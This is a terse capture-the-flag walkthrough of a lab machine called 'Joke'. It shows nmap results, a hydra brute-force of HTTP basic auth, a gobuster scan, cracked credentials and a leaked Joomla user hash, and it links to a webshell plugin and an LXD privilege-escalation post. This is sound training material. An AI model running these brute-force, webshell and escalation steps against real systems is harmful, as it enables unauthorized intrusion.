# Joke (10.10.39.23)

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ad:20:1f:f4:33:1b:00:70:b3:85:cb:87:00:c4:f4:f7 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL89x6yGLD8uQ9HgFK1nvBGpjT6KJXIwZZ56/pjgdRK/dOSpvl0ckMaa68V9bLHvn0Oerh2oa4Q5yCnwddrQnm7JHJ4gNAM+lg+ML7+cIULAHqXFKPpPAjvEWJ7T6+NRrLc9q8EixBsbEPuNer4tGGyUJXg6GpjWL5jZ79TwZ80ANcYPVGPZbrcCfx5yR/1KBTcpEdUsounHjpnpDS/i+2rJ3ua8IPUrqcY3GzlDcvF7d/+oO9GxQ0wjpy1po6lDJ/LytU6IPFZ1Gn/xpRsOxw0N35S7fDuhn69XlXj8xiDDbTlOhD4sNxckX0veXKpo6ynQh5t3yM5CxAQdqRKgFF
|   256 1b:f9:a8:ec:fd:35:ec:fb:04:d5:ee:2a:a1:7a:4f:78 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOzF9YUxQxzgUVsmwq9ZtROK9XiPOB0quHBIwbMQPScfnLbF3/Fws+Ffm/l0NV7aIua0W7FLGP3U4cxZEDFIzfQ=
|   256 dc:d7:dd:6e:f6:71:1f:8c:2c:2c:a1:34:6d:29:99:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPLWfYB8/GSsvhS7b9c6hpXJCO6p1RvLsv4RJMvN4B3r
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HA: Joker
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
8080/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Please enter the password.
```

- 2 HTTP server
- no containers
- Head auth

# HTTP 80

- no robots
- a lot of comments
- found an author: joker
- no hidden dirs

# HTTP 8080

- we need basic auth:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8080 -f 10.10.39.23 http-get

[8080][http-get] host: 10.10.39.23   login: joker   password: hannah
```
- after login we find joomla CMS
- via bruteforcing we found /backup:
```bash
gobuster dir -u http://10.10.39.23:8080/ -U joker -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
```

- the zip is pass protected, after cracking 'hannah'
- we have the entire backend with the DB:
```sql
LOCK TABLES `cc1gr_users` WRITE;
/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;
INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
UNLOCK TABLES;
```

- password of admin user in joomla is: 'abcd1234'
- we can upload webshell from this repo: https://github.com/p0dalirius/Joomla-webshell-plugin/tree/master
- revshell with the webshell

# www-data (ubuntu)

- only joker user
- user www-data is in lxc group:
```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```

- following this blogpost we are root: https://amanisher.medium.com/lxd-privilege-escalation-in-linux-lxd-group-ec7cafe7af63
